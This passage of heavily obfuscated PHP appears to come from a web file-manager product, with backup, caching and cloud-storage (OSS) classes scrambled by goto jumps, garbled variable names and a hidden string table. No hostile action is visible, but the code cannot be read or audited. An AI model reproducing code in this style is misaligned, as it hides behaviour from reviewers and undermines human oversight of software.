$cÁô†Å…¶¾ =& $this->task; if ($Fƒ…«è¿¶Á > 0) { $cÁô†Å…¶¾[$AÃ¤Ïßöó†[1024]] = $AÃ¤Ïßöó†[1589]; $cÁô†Å…¶¾[$AÃ¤Ïßöó†[1575]] = $AÃ¤Ïßöó†[117]; if ($cÁô†Å…¶¾[$AÃ¤Ïßöó†[1573]]) { $cÁô†Å…¶¾[$AÃ¤Ïßöó†[1574]] = $Fƒ…«è¿¶Á; } if ($cÁô†Å…¶¾[$AÃ¤Ïßöó†[1576]]) { $cÁô†Å…¶¾[$AÃ¤Ïßöó†[1574]] = $Fƒ…«è¿¶Á + $cÁô†Å…¶¾[$AÃ¤Ïßöó†[1576]]; } } else { if ($B‘ğá¯Ò· > 0) { if ($cÁô†Å…¶¾[$AÃ¤Ïßöó†[1573]] == $fÜ©õÄëÒÔ) { $cÁô†Å…¶¾[$AÃ¤Ïßöó†[1574]] = $B‘ğá¯Ò·; $cÁô†Å…¶¾[$AÃ¤Ïßöó†[1024]] = $AÃ¤Ïßöó†[1590]; $cÁô†Å…¶¾[$AÃ¤Ïßöó†[1575]] = $AÃ¤Ïßöó†[1095]; } } } $this->update(); } public function curlProgressStart($Eˆ°‚ëä‹Â) { } public function curlProgressEnd($e¡¨ÀˆùÛ´) { goto dïÄ°—ñòÏ; dïÄ°—ñòÏ: $a…Şé–í¥ƒ =& $_SERVER[Ü˜]; $E¢™–ÜĞÎ¾ =& $this->task; $F¾‘àƒíÍ = curl_getinfo($e¡¨ÀˆùÛ´); goto aÕé¶ø÷§; CáËÅ‘Ñ„¼: $this->update(); goto D‰¡²·Õ‡²; aÕé¶ø÷§: $bª¶—êô“ = $F¾‘àƒíÍ[$a…Şé–í¥ƒ[1591]]; if ($bª¶—êô“ == -1) { $bª¶—êô“ = $F¾‘àƒíÍ[$a…Şé–í¥ƒ[1592]]; } if ($E¢™–ÜĞÎ¾[$a…Şé–í¥ƒ[1575]] == $a…Şé–í¥ƒ[117] && $bª¶—êô“) { $E¢™–ÜĞÎ¾[$a…Şé–í¥ƒ[1576]] += $bª¶—êô“; } goto CáËÅ‘Ñ„¼; D‰¡²·Õ‡²: } } goto aÁºšÏÎ¢; C³ó…ÀÚ: function binCheckBigger($e…ŞÖ‘°Ñ, $dºá½¹†™) { return $e…ŞÖ‘°Ñ > $dºá½¹†™; } $_SERVER[$_SERVER[øä][3]] = ("\71\60\63\63"."\x38\x33")+0;$_aQEj="TbzmyGQJmpB89sHyKgM3wvvDuYU5gs6VyxPuHRAqMKePAkHTE7DK5kdn93xVW4uHdhavBta227jGfN5Y";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($BĞ¿ƒ™¨ì”, $bç‹ÀËÄÁ¢) { $e®á¿éÚ†ƒ =& $_SERVER[Ü˜]; if (isset(self::$_methodList[$BĞ¿ƒ™¨ì”])) { return @call_user_func_array(self::$_methodList[$BĞ¿ƒ™¨ì”], $bç‹ÀËÄÁ¢); } else { if (method_exists($this, $BĞ¿ƒ™¨ì”)) { return call_user_func_array(array($this, $BĞ¿ƒ™¨ì”), $bç‹ÀËÄÁ¢); } else { think_exception(__CLASS__ . $e®á¿éÚ†ƒ[4] . $BĞ¿ƒ™¨ì” . $e®á¿éÚ†ƒ[5]); } } } public static function __callStatic($bù‹¤ºÜìµ, $c—‰¿Ú‡Ó‹) { if (isset(self::$_methodListStatic[$bù‹¤ºÜìµ])) { return call_user_func_array(self::$_methodListStatic[$bù‹¤ºÜìµ], $c—‰¿Ú‡Ó‹); } else { if (method_exists(self, $bù‹¤ºÜìµ)) { return call_user_func_array(array(self, $bù‹¤ºÜìµ), $c—‰¿Ú‡Ó‹); } else { show_json("{$bù‹¤ºÜìµ}\x28\x29\x20\x6e\157\164\x20\x65\x78\151\163\x74\73", !1); } } } public static function addMethod($bß®æÂ‹, $eÎ¼‡ê–ë•) { self::$_methodList[$bß®æÂ‹] = $eÎ¼‡ê–ë•; } public static function addMethodStatic($dæ‹óÄÂ‰¥, $d¼„İó±äà) { self::$_methodListStatic[$dæ‹óÄÂ‰¥] = $d¼„İó±äà; } } goto Eî¤•ßÍÓ­; aä‘Ñ­î§: class BackupFile { public function __construct() { } public function index() { goto F«àçš¹Í˜; b„èØ§í¶: $b¶ĞíùÌ„‘ = !0; $cÇÑë×îµó = $this->storeIds(); $a†ÜµÕª½ = 1; goto F—İ¹åİ‰”; fšß‰±Ä±: $BâÕ‡ºáßª->task[$_SERVER[Ü˜][732]] = $AÔÓæÉŠ©‹; $eÙ¿¹•„Å¤ = array($_SERVER[Ü˜][785] => $BÔ¿±øâÔÂ, $_SERVER[Ü˜][786] => $AÔÓæÉŠ©‹, $_SERVER[Ü˜][787] => time()); Backup::set($eÙ¿¹•„Å¤); goto b„èØ§í¶; f¤å‹­ëì : $this->_fileFilter($a·àÂ•ÓŸÇ); return !0; goto Eó‚»„ìÄ¦; F«àçš¹Í˜: $B–ÃÊçÙ¶“ = Backup::get(); $fÒ¼“§‰šˆ = $B–ÃÊçÙ¶“[$_SERVER[Ü˜][300]][$_SERVER[Ü˜][203]][$_SERVER[Ü˜][456]]; $a¯¬Ö©¬šª = array($_SERVER[Ü˜][457] => array($_SERVER[Ü˜][781], $fÒ¼“§‰šˆ), $_SERVER[Ü˜][782] => array($_SERVER[Ü˜][338], $B–ÃÊçÙ¶“[$_SERVER[Ü˜][721]])); goto bãƒÑÂ×; FòŒÇĞŒ²Ü: $fØ¬È˜ÌÓ = $c¬…¤¬à±Ì = 0; do { $A‰‰„ˆï§ = $_SERVER[Ü˜][788]; $CãĞ‡ÛÇö® = Model($_SERVER[Ü˜][756])->where($a¯¬Ö©¬šª)->field($A‰‰„ˆï§)->order($_SERVER[Ü˜][789])->selectPage($A‘ã¨œÍ¡Õ, $a†ÜµÕª½); $fë†ĞŞ–í± = !empty($CãĞ‡ÛÇö®[$_SERVER[Ü˜][376]]) ? $CãĞ‡ÛÇö®[$_SERVER[Ü˜][376]] : array(); foreach ($fë†ĞŞ–í± as $fôŸ×ï”¢Ä) { goto C–Âçß„× ; aåŸ½ÅÂ±: if (IO::exist($DòáŞÙŒ¶™)) { $BâÕ‡ºáßª->updateFileEnd($fôŸ×ï”¢Ä[$_SERVER[Ü˜][28]], $fôŸ×ï”¢Ä[$_SERVER[Ü˜][88]]); } else { $DòáŞÙŒ¶™ = get_path_father($DòáŞÙŒ¶™); IO::mkdir($DòáŞÙŒ¶™); if (!IO::copy($cŠÔò‡«, $DòáŞÙŒ¶™, $_SERVER[Ü˜][792])) { write_log($_SERVER[Ü˜][793] . $cŠÔò‡« . $_SERVER[Ü˜][776] . $DòáŞÙŒ¶™ . $_SERVER[Ü˜][513], $_SERVER[Ü˜][751]); $b¶ĞíùÌ„‘ = !1; break; } } $fÒ¼“§‰šˆ = $fôŸ×ï”¢Ä[$_SERVER[Ü˜][456]]; $dĞÆƒ—‡Éß += 1; goto B¸ŠÚ—ÆŠÌ; FÓÁ‰Óˆà®: if ($bÃ¸ë†›ì >= 1024 * 1024 * 100) { $eÙ¿¹•„Å¤ = array($_SERVER[Ü˜][794] => $fÒ¼“§‰šˆ, $_SERVER[Ü˜][795] => $c¬…¤¬à±Ì, $_SERVER[Ü˜][796] => $fØ¬È˜ÌÓ); Backup::set($eÙ¿¹•„Å¤); $bÃ¸ë†›ì = $dĞÆƒ—‡Éß = 0; } goto F×†”íŞ³¥; C–Âçß„× : if (!$this->_fileExist($fôŸ×ï”¢Ä, $a·àÂ•ÓŸÇ, $cÇÑë×îµó)) { $BÔ¿±øâÔÂ -= 1; $AÔÓæÉŠ©‹ -= (int) $fôŸ×ï”¢Ä[$_SERVER[Ü˜][88]]; write_log("\x66\x69\154\x65\40\156\x6f\x74\x20\x65\x78\x69\163\164\x2e\x66\151\x6c\145\111\x44\x3a{$fôŸ×ï”¢Ä[$_SERVER[Ü˜][456]]}\54\40\x70\141\164\150\x3a{$fôŸ×ï”¢Ä[$_SERVER[Ü˜][86]]}", $_SERVER[Ü˜][790]); continue; } $cŠÔò‡« = $fôŸ×ï”¢Ä[$_SERVER[Ü˜][86]]; $DòáŞÙŒ¶™ = "\173\151\157\x3a{$B–ÃÊçÙ¶“[$_SERVER[Ü˜][721]]}\x7d" . substr($cŠÔò‡«, strlen("\173\151\x6f\72{$fôŸ×ï”¢Ä[$_SERVER[Ü˜][791]]}\175")); goto aåŸ½ÅÂ±; B¸ŠÚ—ÆŠÌ: $bÃ¸ë†›ì += $fôŸ×ï”¢Ä[$_SERVER[Ü˜][88]]; $c¬…¤¬à±Ì += 1; $fØ¬È˜ÌÓ += $fôŸ×ï”¢Ä[$_SERVER[Ü˜][88]]; goto FÓÁ‰Óˆà®; F×†”íŞ³¥: } $b´–£‚²ÙŞ = count($fë†ĞŞ–í±); $a†ÜµÕª½++; } while ($b´–£‚²ÙŞ == $A‘ã¨œÍ¡Õ); $BâÕ‡ºáßª->end(); goto DÕÅ’Ä¢êí; DÕÅ’Ä¢êí: $eÙ¿¹•„Å¤ = array($_SERVER[Ü˜][797] => 1, $_SERVER[Ü˜][485] => time(), $_SERVER[Ü˜][744] => 1, $_SERVER[Ü˜][794] => $fÒ¼“§‰šˆ, $_SERVER[Ü˜][786] => $AÔÓæÉŠ©‹, $_SERVER[Ü˜][785] => $BÔ¿±øâÔÂ, $_SERVER[Ü˜][798] => time()); if ($dĞÆƒ—‡Éß) { $eÙ¿¹•„Å¤[$_SERVER[Ü˜][795]] = $c¬…¤¬à±Ì; $eÙ¿¹•„Å¤[$_SERVER[Ü˜][796]] = $fØ¬È˜ÌÓ; } Backup::set($eÙ¿¹•„Å¤); goto f¤å‹­ëì ; bãƒÑÂ×: $BÔ¿±øâÔÂ = (int) Model($_SERVER[Ü˜][756])->where($a¯¬Ö©¬šª)->count($_SERVER[Ü˜][456]); $AÔÓæÉŠ©‹ = (int) Model($_SERVER[Ü˜][756])->where($a¯¬Ö©¬šª)->sum($_SERVER[Ü˜][88]); $BâÕ‡ºáßª = new TaskFileTransfer($_SERVER[Ü˜][783], $_SERVER[Ü˜][751], $BÔ¿±øâÔÂ, LNG($_SERVER[Ü˜][752]) . $_SERVER[Ü˜][753] . LNG($_SERVER[Ü˜][784])); goto fšß‰±Ä±; F—İ¹åİ‰”: $A‘ã¨œÍ¡Õ = 1000; $bÃ¸ë†›ì = $dĞÆƒ—‡Éß = 0; $a·àÂ•ÓŸÇ = array(); goto FòŒÇĞŒ²Ü; Eó‚»„ìÄ¦: } private function _fileExist($B¨¼ÃæùªÈ, &$A÷ÕÛ¢×Ø, $fğ¦ß¨Ö) { goto eÈ¤ÓŞ×òÂ; eÈ¤ÓŞ×òÂ: $Fµ˜¹Õ¨¢Ú =& $_SERVER[Ü˜]; $CÛÔ®—øØ = $B¨¼ÃæùªÈ[$Fµ˜¹Õ¨¢Ú[86]]; if (in_array($B¨¼ÃæùªÈ[$Fµ˜¹Õ¨¢Ú[456]], $A÷ÕÛ¢×Ø)) { return !1; } goto Eî’ŞÂ”; Eä•ê¬¼×: if (IO::exist($Fë¥ÁÏƒ±)) { $A÷ÕÛ¢×Ø[] = $B¨¼ÃæùªÈ[$Fµ˜¹Õ¨¢Ú[456]]; return !1; } $bÑ†øí¼© = array($Fµ˜¹Õ¨¢Ú[791] => $B¨¼ÃæùªÈ[$Fµ˜¹Õ¨¢Ú[791]], $Fµ˜¹Õ¨¢Ú[86] => array($Fµ˜¹Õ¨¢Ú[389], "{$Fë¥ÁÏƒ±}\x25")); $CŒğÈÔŠ = Model($Fµ˜¹Õ¨¢Ú[756])->where($bÑ†øí¼©)->field($Fµ˜¹Õ¨¢Ú[457])->select(); goto E ¾êõ†‘; Eî’ŞÂ”: if (!in_array($B¨¼ÃæùªÈ[$Fµ˜¹Õ¨¢Ú[791]], $fğ¦ß¨Ö)) { return !1; } if (IO::exist($CÛÔ®—øØ)) { return !0; } $Fë¥ÁÏƒ± = get_path_father($CÛÔ®—øØ); goto Eä•ê¬¼×; E ¾êõ†‘: $A÷ÕÛ¢×Ø = array_merge($A÷ÕÛ¢×Ø, array_to_keyvalue($CŒğÈÔŠ, $Fµ˜¹Õ¨¢Ú[33], $Fµ˜¹Õ¨¢Ú[456])); return !1; goto D­×Ûœ³„õ; D­×Ûœ³„õ: } private function _fileFilter($C‰‰Ú›è) { $d¹ĞÃÈ— =& $_SERVER[Ü˜]; if (empty($C‰‰Ú›è)) { return; } $dË±é„´”ô = array($d¹ĞÃÈ—[456] => array($d¹ĞÃÈ—[7], array_unique($C‰‰Ú›è))); $FÈ‰…Šœ¼Ñ = Model($d¹ĞÃÈ—[799])->where($dË±é„´”ô)->field($d¹ĞÃÈ—[404])->select(); foreach ($FÈ‰…Šœ¼Ñ as $añÅË µÔÃ) { Model($d¹ĞÃÈ—[799])->remove($añÅË µÔÃ[$d¹ĞÃÈ—[404]], !1); } } private function storeIds() { $c·ºµ¿–‰­ =& $_SERVER[Ü˜]; $d„Æ©šñ¤Î = Model($c·ºµ¿–‰­[736])->listData(); $D–Øò·÷Éî = array(); $Dåœ”ÒÀ  = $GLOBALS[$c·ºµ¿–‰­[6]][$c·ºµ¿–‰­[98]][$c·ºµ¿–‰­[800]]; foreach ($d„Æ©šñ¤Î as $E½Õ²²Œ·à) { $D‹ï«¹¨§Í = strtolower($E½Õ²²Œ·à[$c·ºµ¿–‰­[104]]); if (!isset($Dåœ”ÒÀ [$D‹ï«¹¨§Í])) { continue; } $dƒœÀÓôí¼ = $c·ºµ¿–‰­[82] . (isset($Dåœ”ÒÀ [$D‹ï«¹¨§Í]) ? $Dåœ”ÒÀ [$D‹ï«¹¨§Í] : ucfirst($D‹ï«¹¨§Í)); if (!class_exists($dƒœÀÓôí¼)) { continue; } $D–Øò·÷Éî[] = $E½Õ²²Œ·à[$c·ºµ¿–‰­[402]]; } return $D–Øò·÷Éî; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto a¢÷ÓéÊĞ; dØÊ‡§´‚¸: $b£ó¹«ƒ§ƒ = $GLOBALS[$a£“´¶îˆ½[6]][$a£“´¶îˆ½[356]]; $BÄçßŠÎÁ = $b£ó¹«ƒ§ƒ[$b£ó¹«ƒ§ƒ[$a£“´¶îˆ½[801]]]; $e§÷Å÷Ó…‚ = $b£ó¹«ƒ§ƒ[$a£“´¶îˆ½[802]]; goto Aƒ‚²ß¡¾ƒ; a¢÷ÓéÊĞ: $a£“´¶îˆ½ =& $_SERVER[Ü˜]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto dØÊ‡§´‚¸; Aƒ‚²ß¡¾ƒ: switch ($b£ó¹«ƒ§ƒ[$a£“´¶îˆ½[801]]) { case $a£“´¶îˆ½[17]: self::$handle = Model($a£“´¶îˆ½[803]); break; case $a£“´¶îˆ½[804]: self::$handle = new CacheRedis($BÄçßŠÎÁ, $e§÷Å÷Ó…‚); break; case $a£“´¶îˆ½[805]: self::$handle = new CacheMemcached($BÄçßŠÎÁ, $e§÷Å÷Ó…‚); break; case $a£“´¶îˆ½[203]: self::$handle = new CacheFile($BÄçßŠÎÁ, $e§÷Å÷Ó…‚); break; default: break; } return self::$handle; goto c¡¨Ò«–«; c¡¨Ò«–«: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($dîÉ±ò¸ª) { if (is_array($dîÉ±ò¸ª) || is_object($dîÉ±ò¸ª)) { $dîÉ±ò¸ª = json_encode($dîÉ±ò¸ª); } $dîÉ±ò¸ª = rawurlencode($dîÉ±ò¸ª); return md5(KOD_SITE_ID . $_SERVER[Ü˜][81] . $dîÉ±ò¸ª); } public static function get($aÑ‘ˆ‰Ö¯Ş, $EˆµË÷ŠŠ‰ = false) { $dÏì­¶Œ¦° = self::key($aÑ‘ˆ‰Ö¯Ş); if ($EˆµË÷ŠŠ‰) { return unserialize(self::init()->get($dÏì­¶Œ¦°)); } if (!isset(self::$memoryCache[$dÏì­¶Œ¦°])) { $b§è½÷¥…» = self::init()->get($dÏì­¶Œ¦°); self::$memoryCache[$dÏì­¶Œ¦°] = unserialize($b§è½÷¥…»); } return self::$memoryCache[$dÏì­¶Œ¦°]; } public static function set($fö¶òºë×, $DÀßÙôíµ¾, $cêºƒ©í„ = false) { goto fÑ’×¾Ş±Š; fÑ’×¾Ş±Š: $bñ»“ï×ö = self::key($fö¶òºë×); if (isset(self::$memoryCache[$bñ»“ï×ö]) && self::$memoryCache[$bñ»“ï×ö] === $DÀßÙôíµ¾) { return !0; } if ($cêºƒ©í„ === 0) { self::$memoryCache[$bñ»“ï×ö] = $DÀßÙôíµ¾; return !0; } goto Aµø¤ŠØˆ; dëÆŸ÷°–œ: CacheLock::unlock($fö¶òºë×); return $Fï¥ë†Ëì; goto a‡å—ˆº…Ã; Aµø¤ŠØˆ: CacheLock::lock($fö¶òºë×); $Fï¥ë†Ëì = self::init()->set($bñ»“ï×ö, serialize($DÀßÙôíµ¾), $cêºƒ©í„); self::$memoryCache[$bñ»“ï×ö] = $DÀßÙôíµ¾; goto dëÆŸ÷°–œ; a‡å—ˆº…Ã: } public static function getCall($Bï¤¥ÍŒ, $e™İ£ª³¹‡, $e‹Œù‹Øì·, $e†®„ªå¦ç = array()) { goto fŞÏ»é«˜³; CÌøàª¿‰: return $f†‡…Ò‚Š; goto båã¶ò•ï•; fŞÏ»é«˜³: $DÌ¿Ê‹«ğ‘ =& $_SERVER[Ü˜]; $f†‡…Ò‚Š = self::get($Bï¤¥ÍŒ); if ($f†‡…Ò‚Š || $f†‡…Ò‚Š === $DÌ¿Ê‹«ğ‘[33]) { return $f†‡…Ò‚Š; } goto b÷¹ù­Óª; b÷¹ù­Óª: $f†‡…Ò‚Š = call_user_func_array($e‹Œù‹Øì·, $e†®„ªå¦ç); $f†‡…Ò‚Š = $f†‡…Ò‚Š ? $f†‡…Ò‚Š : $DÌ¿Ê‹«ğ‘[33]; self::set($Bï¤¥ÍŒ, $f†‡…Ò‚Š, $e™İ£ª³¹‡); goto CÌøàª¿‰; båã¶ò•ï•: } public static function remove($Fß‡¥äŒó´) { goto E—Üõ¡ºØ‡; f‚àÜ—øõ: return $aäØšíõÙç; goto aò‰åéÕÁ; döİê„÷¿ğ: CacheLock::lock($Fß‡¥äŒó´); $aäØšíõÙç = self::init()->remove($AÁ‚Ú™‘Œˆ); CacheLock::unlock($Fß‡¥äŒó´); goto f‚àÜ—øõ; E—Üõ¡ºØ‡: $AÁ‚Ú™‘Œˆ = self::key($Fß‡¥äŒó´); unset(self::$memoryCache[$AÁ‚Ú™‘Œˆ]); self::clearTimeout(); goto döİê„÷¿ğ; aò‰åéÕÁ: } public static function removeMemory($d„›òš½âé) { $fÕÍÉ»¹¡ = self::key($d„›òš½âé); unset(self::$memoryCache[$fÕÍÉ»¹¡]); } public static function clearMemory($f¾íÅš„×¢ = false) { if ($f¾íÅš„×¢) { $f¾íÅš„×¢ = self::key($f¾íÅš„×¢); unset(self::$memoryCache[$f¾íÅš„×¢]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[Ü˜][806])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[Ü˜][807])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($DÛÌä†Š˜Õ, $c‹éÚŒ‹’) { $DœôÏ´ˆ¼ =& $_SERVER[Ü˜]; $this->cachePath = $DÛÌä†Š˜Õ[$DœôÏ´ˆ¼[86]]; $this->prefix = $DœôÏ´ˆ¼[808]; $this->cacheTime = $c‹éÚŒ‹’; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($f¬òŒÎ¶) { $då‘„‘Í =& $_SERVER[Ü˜]; $f¬òŒÎ¶ = str_replace(array($då‘„‘Í[809], $då‘„‘Í[107], $då‘„‘Í[80]), $då‘„‘Í[810], $f¬òŒÎ¶); return $this->cachePath . $då‘„‘Í[811] . $f¬òŒÎ¶ . $då‘„‘Í[812]; } public function set($f‰İ¥„Æ¦, $DÂˆ½“…ó, $E£À¢²ø¢¸ = false) { $D¨œËÔ¹Ò = $this->getFile($f‰İ¥„Æ¦); if (file_put_contents($D¨œËÔ¹Ò, $this->prefix . $DÂˆ½“…ó, LOCK_EX)) { @touch($D¨œËÔ¹Ò, intval(time() + $E£À¢²ø¢¸)); clearstatcache(); return !0; } @unlink($D¨œËÔ¹Ò); return !1; } public function get($Dá¾‹ïÜ…) { $fÄæÚñŒ¦Œ = $this->getFile($Dá¾‹ïÜ…); if (file_exists($fÄæÚñŒ¦Œ) && filemtime($fÄæÚñŒ¦Œ) < time()) { @unlink($fÄæÚñŒ¦Œ); return !1; } $bÎ¹´å÷–Ü = @file_get_contents($fÄæÚñŒ¦Œ); return substr($bÎ¹´å÷–Ü, strlen($this->prefix)); } public function remove($DŠ†Ñê¨Ì) { $A†Ä„­”‚ = $this->getFile($DŠ†Ñê¨Ì); return @unlink($A†Ä„­”‚); } public function deleteAll() { $E¢„ƒ×Ú‘ =& $_SERVER[Ü˜]; $CãùÉÏâÕÇ = scandir($this->cachePath); foreach ($CãùÉÏâÕÇ as $e£Ş†Öˆ©) { $c®‚¾›†Ğ¹ = $this->cachePath . $e£Ş†Öˆ©; if (strpos($c®‚¾›†Ğ¹, $E¢„ƒ×Ú‘[812]) && strpos($c®‚¾›†Ğ¹, $E¢„ƒ×Ú‘[813])) { @unlink($c®‚¾›†Ğ¹); } } } public function clearTimeout() { $f“İãâÈÁ… =& $_SERVER[Ü˜]; $c‘©·Â‚• = scandir($this->cachePath); foreach ($c‘©·Â‚• as $cßÁ™í™”Š) { $CŠ„½¬Éßá = $this->cachePath . $cßÁ™í™”Š; if (strpos($CŠ„½¬Éßá, $f“İãâÈÁ…[812]) && strpos($CŠ„½¬Éßá, $f“İãâÈÁ…[813]) && filemtime($CŠ„½¬Éßá) < time()) { @unlink($CŠ„½¬Éßá); } } } } goto FÆäšèÃãŞ; fŞ²›³±íÔ: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public function __construct($A½¿„Òí±«) { parent::__construct(); include_once SDK_DIR . $_SERVER[Ü˜][1261]; $this->_init($A½¿„Òí±«); } public function _init($d‡Ç„Œ´©‹) { $E²ø³¾±È¼ =& $_SERVER[Ü˜]; foreach ($d‡Ç„Œ´©‹ as $Få×à¿Íœç => $c¾ôå¹†ë) { if (isset($this->{$Få×à¿Íœç})) { $this->{$Få×à¿Íœç} = $c¾ôå¹†ë; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($E²ø³¾±È¼[1262] . LNG($E²ø³¾±È¼[1263])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto cæáñÂÎ‹§; AÀøÔ’•Ä: $fï‹³Ô‰‰”->addAllowedOrigin($aôîÕ¾‰ê[1264]); $fï‹³Ô‰‰”->addAllowedMethod($aôîÕ¾‰ê[1265]); $fï‹³Ô‰‰”->addAllowedMethod($aôîÕ¾‰ê[1266]); goto d¿¸á™¥¶; cæáñÂÎ‹§: $aôîÕ¾‰ê =& $_SERVER[Ü˜]; $D…íİä÷ĞÜ = new OSS\Model\CorsConfig(); $fï‹³Ô‰‰” = new OSS\Model\CorsRule(); goto AÀøÔ’•Ä; d¿¸á™¥¶: $fï‹³Ô‰‰”->addAllowedMethod($aôîÕ¾‰ê[1267]); $fï‹³Ô‰‰”->addAllowedMethod($aôîÕ¾‰ê[1268]); $fï‹³Ô‰‰”->addAllowedMethod($aôîÕ¾‰ê[168]); goto DÔßÎš„–; bÅá˜ÛÜ¸: $D…íİä÷ĞÜ->addRule($fï‹³Ô‰‰”); try { $this->client->putBucketCors($this->bucket, $D…íİä÷ĞÜ); } catch (OSS\Core\OssException $C…ëêœó¢¡) { return !1; } return !0; goto aÔõ‡‰ò¸; DÔßÎš„–: $fï‹³Ô‰‰”->setMaxAgeSeconds(600); $fï‹³Ô‰‰”->addExposeHeader($aôîÕ¾‰ê[1269]); $fï‹³Ô‰‰”->addAllowedHeader($aôîÕ¾‰ê[1264]); goto bÅá˜ÛÜ¸; aÔõ‡‰ò¸: } public function getBucketCors() { goto c„íòÈ¼è; e÷ÍÔ•Œ¾: if (!$cëÈ¶‘™Ü¡ || !($B…åƒ½‘±ğ = $cëÈ¶‘™Ü¡->getRules())) { return null; } $Bƒ¥ÌÂÁÏ³ = $B…åƒ½‘±ğ[0]->getAllowedOrigins(); $d«®æÉÅâÃ = $B…åƒ½‘±ğ[0]->getAllowedMethods(); goto A±±Øœë—; c„íòÈ¼è: $E„ù‹³ùá =& $_SERVER[Ü˜]; $cëÈ¶‘™Ü¡ = null; try { $cëÈ¶‘™Ü¡ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $A¦‹æÚŸò¼) { return null; } goto e÷ÍÔ•Œ¾; BÆ‰‹áĞ–³: return array($E„ù‹³ùá[191] => isset($Bƒ¥ÌÂÁÏ³[0]) ? $Bƒ¥ÌÂÁÏ³[0] : $E„ù‹³ùá[33], $E„ù‹³ùá[195] => $d«®æÉÅâÃ, $E„ù‹³ùá[1270] => $cÑòÑç’, $E„ù‹³ùá[1271] => isset($E®Õ†Ä¶íô[0]) ? $E®Õ†Ä¶íô[0] : $E„ù‹³ùá[33], $E„ù‹³ùá[193] => isset($FËìêùä¦Ò[0]) ? $FËìêùä¦Ò[0] : $E„ù‹³ùá[33]); goto DÚãÑ¸Í‰; A±±Øœë—: $cÑòÑç’ = $B…åƒ½‘±ğ[0]->getMaxAgeSeconds(); $E®Õ†Ä¶íô = $B…åƒ½‘±ğ[0]->getExposeHeaders(); $FËìêùä¦Ò = $B…åƒ½‘±ğ[0]->getAllowedHeaders(); goto BÆ‰‹áĞ–³; DÚãÑ¸Í‰: } public function isBucketCors() { goto a·•éÓ‡ÙÕ; aà³¶îï¬…: if ($b¹åË„êôˆ[$CæÎÃ¨‚¹ø[191]] != $CæÎÃ¨‚¹ø[192] || $b¹åË„êôˆ[$CæÎÃ¨‚¹ø[193]] != $CæÎÃ¨‚¹ø[192]) { return !1; } $Få£õç“îñ = array_map($CæÎÃ¨‚¹ø[194], $b¹åË„êôˆ[$CæÎÃ¨‚¹ø[195]]); if (!is_array($Få£õç“îñ)) { $Få£õç“îñ = array(); } goto Eš¯½îİŠÖ; a·•éÓ‡ÙÕ: $CæÎÃ¨‚¹ø =& $_SERVER[Ü˜]; $b¹åË„êôˆ = $this->getBucketCors(); if (!$b¹åË„êôˆ || !is_array($b¹åË„êôˆ)) { return !1; } goto aà³¶îï¬…; Eš¯½îİŠÖ: $c›åÀ®¤¡» = array($CæÎÃ¨‚¹ø[196], $CæÎÃ¨‚¹ø[197], $CæÎÃ¨‚¹ø[198], $CæÎÃ¨‚¹ø[199], $CæÎÃ¨‚¹ø[200]); $fÓŸñÙ©Šµ = array_diff($c›åÀ®¤¡», $Få£õç“îñ); return empty($fÓŸñÙ©Šµ); goto Dêòã·÷¼è; Dêòã·÷¼è: } public function mkfile($bİğºŠ«‚”, $a—ˆÁĞÂ™ƒ = '', $C¿‡íÜÀ‚° = REPEAT_RENAME) { $bÒ ™æÈÄ„ = $this->setContent($bİğºŠ«‚”, $a—ˆÁĞÂ™ƒ); if ($bÒ ™æÈÄ„ !== !1) { return $this->getPathOuter($bİğºŠ«‚”); } return !1; } public function mkdir($B«ãá“×ëÃ, $f‘ìîº¿çé = REPEAT_SKIP) { if ($this->_isFolder($B«ãá“×ëÃ)) { return $this->getPathOuter($B«ãá“×ëÃ); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($B«ãá“×ëÃ)); } catch (OSS\Core\OssException $fÌ±¼Í“Ó²) { return !1; } return $this->getPathOuter($B«ãá“×ëÃ); } private function fileList($EĞÇ´²ñ°, $E‚ÀÎˆÏ = '', $EÏÈ·ôé®­ = 0) { goto e›‰ª™’ß¾; C…à“ï­‚: $CìŸŸ‹œ = $cÁË×¨Íá  = array(); while (!0) { check_abort(); $aƒãöÑË  = array($DŸ·ñÄÎ“¶[1272] => $E‚ÀÎˆÏ, $DŸ·ñÄÎ“¶[1273] => $f’âÅÊà, $DŸ·ñÄÎ“¶[1274] => $dá”Æ¢ö«ğ, $DŸ·ñÄÎ“¶[1275] => $D¶±ÍÕŞ£µ); try { $e…¬“±‚‚ = $this->client->listObjects($this->bucket, $aƒãöÑË ); } catch (OSS\Core\OssException $FĞ½ŒªòÀ¨) { break; } $D¶±ÍÕŞ£µ = $e…¬“±‚‚->getNextMarker(); $B«ó¯Ğ³äÆ = $e…¬“±‚‚->getObjectList(); $B ­í†á = $e…¬“±‚‚->getPrefixList(); foreach ($B«ó¯Ğ³äÆ as $BÎ…ëŞŸŒñ) { goto Cä’’ÒÅ¡•; eĞìÑÙŒÓ: if ($F³ºÕ¨åÉ) { $this->cacheMethod($DŸ·ñÄÎ“¶[209], $a­‘Ö¯Ë¡¯, $aÑÌÇ”²â); $this->cacheMethod($DŸ·ñÄÎ“¶[210], $a­‘Ö¯Ë¡¯, array($DŸ·ñÄÎ“¶[88] => $EÑ¬ˆæòùá, $DŸ·ñÄÎ“¶[1276] => $EÑ¬ˆæòùá, $DŸ·ñÄÎ“¶[94] => strtotime($E²è­’Ê¿â), $DŸ·ñÄÎ“¶[1277] => $E²è­’Ê¿â)); } if ($aÑÌÇ”²â) { $CìŸŸ‹œ[] = $a­‘Ö¯Ë¡¯; continue; } $cÁË×¨Íá [] = 